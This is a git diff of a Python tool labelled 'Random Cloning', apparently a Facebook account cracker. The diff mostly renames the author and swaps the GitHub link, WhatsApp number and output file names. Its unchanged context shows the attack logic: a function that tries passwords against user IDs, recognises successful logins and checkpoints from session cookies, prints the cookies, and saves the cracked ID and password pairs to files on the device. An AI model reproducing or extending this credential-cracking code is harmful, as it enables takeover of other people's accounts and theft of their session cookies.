@@ -18,9 +18,9 @@ def o():
     if Mahin == '1':
         i()
     if Mahin == '2':
-        os.system('xdg-open https://github.com/ANONYMOUS-U7P4L ')
+        os.system('xdg-open https://github.com/DARK-TOXIC ')
     if Mahin == '3':
-        os.system('xdg-open https://github.com/ANONYMOUS-U7P4L ')
+        os.system('xdg-open https://github.com/DARK-TOXIC ')
     if Mahin == 'E':
         os.system('exit')
         return None
@@ -135,9 +135,9 @@ logo=("""
 ███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
 
 \033[1;32m  ╔═══════════════════════════════════════════════════╗
-\033[1;97m  ╠══[Author:=======================> \33[1;38ANONYMOUS U7P4L  \33[1;38m   ║
-\033[1;32m  ╠══[Facebook:=====================> ANONYMOUS U7P4L      ║ 
-\033[1;97m  ╠══[Whatsapp:=====================> 01761282729     ║
+\033[1;97m  ╠══[Author:=======================> DARK-TOXIC[1;38m   ║
+\033[1;32m  ╠══[Facebook:=====================> DARK-TOXIC      ║ 
+\033[1;97m  ╠══[Whatsapp:=====================> 01822402153     ║
 \033[1;97m  ╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
 \033[1;31m  ╠══[VERSION:======================> 4.0.1           ║
 \033[1;32m  ╚═══════════════════════════════════════════════════╝
@@ -296,21 +296,21 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m[U7P4L-OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
-                open('/sdcard/U7P4L-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                print('\033[38;5;46m[Toxic-OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
+                open('/sdcard/Toxic-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m[U7P4L-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
-                open('/sdcard/U7P4L-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\033[38;5;46m[Toxic-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
+                open('/sdcard/Toxic-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r    \33[1;93m[\033[1;95mMAHIN\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
+        sys.stdout.write('\r    \33[1;93m[\033[1;95mMohin\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
